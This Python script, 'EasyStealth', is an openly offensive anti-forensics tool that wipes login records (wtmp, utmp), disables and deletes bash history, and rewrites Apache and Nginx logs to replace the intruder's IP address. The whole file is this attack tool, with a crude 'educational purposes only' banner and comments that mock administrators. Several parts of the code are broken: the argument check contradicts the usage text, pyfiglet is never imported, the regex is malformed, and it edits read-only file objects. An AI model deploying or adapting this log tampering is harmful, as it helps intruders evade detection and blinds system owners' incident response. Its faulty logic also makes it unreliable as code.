from pathlib import Path
from pyfiglet import Figlet
import distro
import os
import time
import re
import sys
import requests

# Advanced EasyStealth | EDUCATIONAL PURPOSES ONLY!
# Author: Emirhan Sarikaya 
# This is a stealthy tool which replaces all known log files for Apache / Nginx with dummy data.
# This tool also takes care of other logging files like /var/log/utmp & /var/log/btmp
# It also leaves no trace in the bash history and takes care the $HISTFILE/$HISTFILESIZE ect.


# ayo puto! awkos is een script kiddy
apacheClear = "81.208.21.103"
yourIP = sys.argv[1]
pwnage = sys.argv[2]
regexMatchIP = re.compile(r".*fwd=\"\" + yourIP + \"\".*$")

if len(sys.argv) != 2:
    ascii_art = pyfiglet.figlet_format("ezStealth")
    print(ascii_art)
    time.sleep(1)
    print("\n \n \n example: " + sys.argv[0] + "<your_ip> <your_site>")
    print("\n [-] usage: " + sys.argv[0] + " 1.1.1.1 http://mywebsite.com/")
else:
    
    def clearSystemLogs():
        fuckWTMP = "cat /dev/null > /var/log/wtmp"
        fuckUTMP = "cat /dev/null > /var/log/utmp"
        skunk = "export HISTFILE=/dev/null && set -o history && rm -rf ~/.bash_history"
        if os.geteuid() != 0:
            print("[-] u dont even have root permissions m0r0n")
        else:
            print("[+] ok preparing system cleanup")
            os.system(skunk)
            print("[+] nice, bash history won't be saved after this")
            os.system(fuckWTMP)
            os.system(fuckUTMP)


    def clearApacheAccessLogs():
        logfilesPathApache = ["/var/log/apache2", "/var/log/apache"]
        if os.path.exists(logfilesPathApache[0]):
            with open("/var/log/apache2/access.log", "r") as log_file:
                for line in log_file:
                    if(regexMatchIP.search(line)):
                        log_file.replace(regexMatchIP, apacheClear)
        elif os.path.exists(logfilesPathApache[1]):
            with open("/var/log/apache/access.log", "r") as log_file:
                for line in log_file:
                    if(regexMatchIP.search(line)):
                        log_file.replace(regexMatchIP, apacheClear)
        else:
            print("\n [-] Fatal: sorry but sysadmin is not a monkey, look for log files yourself \n")


    def clearApacheErrorLogs():
        errorfilesPathApache = ["/var/log/apache2", "/var/log/apache"]
        if os.path.exists(errorfilesPathApache[0]):
            with open("/var/log/apache2/error.log", "r") as error_file:
                for line in error_file:
                    if(regexMatchIP.search(line)):
                        error_file.replace(regexMatchIP, apacheClear)
        elif os.path.exists(errorfilesPathApache[1]):
            with open("/var/log/apache/error.log", "r") as error_file:
                for line in error_file:
                    if(regexMatchIP.search(line)):
                        error_file.replace(regexMatchIP, apacheClear)
        else:
            print("\n [-] Fatal: sorry but sysadmin is not a monkey, look for log files yourself \n")


    def clearNginxAccessLogs():
        logfilesPathNginx = ["/var/log/nginx/", "/var/log/httpd/"]
        if os.path.exists(logfilesPathNginx[0]):
            with open("/var/log/nginx/access.log", "r") as log_file:
                for line in log_file:
                    if(regexMatchIP.search(line)):
                        log_file.replace(regexMatchIP, apacheClear)
        elif os.path.exists(logfilesPathNginx[1]):
            with open("/var/log/nginx/access.log", "r") as log_file:
                for line in log_file:
                    if(regexMatchIP.search(line)):
                        log_file.replace(regexMatchIP, apacheClear)
        else:
            print("\n [-] Fatal: sorry but sysadmin is not a monkey, look for log files yourself \n")
    

    if(distro.id() == "ubuntu" or distro.id() == "debian"):
        print("[+] nice, detected ubuntu/debian system")
        request = requests.get(pwnage) # ik weet, ik ben lui
        if "Apache" in request.headers['server']:
            print("[+] mhm, detected apache :) \n")
            time.sleep(1)
            clearApacheAccessLogs()
            print("[*] Cleared apache access.log... \n")
            clearApacheErrorLogs()
            print("[*] Cleared apache error.log.... \n")
            print("[*] VICTORY! clearing system logs, UTMP/BTMP/UTMPX/BTMPX ect")
            time.sleep(1)
            clearSystemLogs()
        elif "nginx" in request.headers['server']:
            print("[+] mhm, detected nginx :) \n")
            time.sleep(1)
            clearNginxAccessLogs()
            print("[*] Cleared nginx access logs :) \n")
            time.sleep(2)
            print("[*] VICTORY! clearing system logs and u good 2 go")
        else:
            print("\n \n [-] Fatal fucking error: couldn't tell which webserver this runs on... :( \n \n")

# s/o myself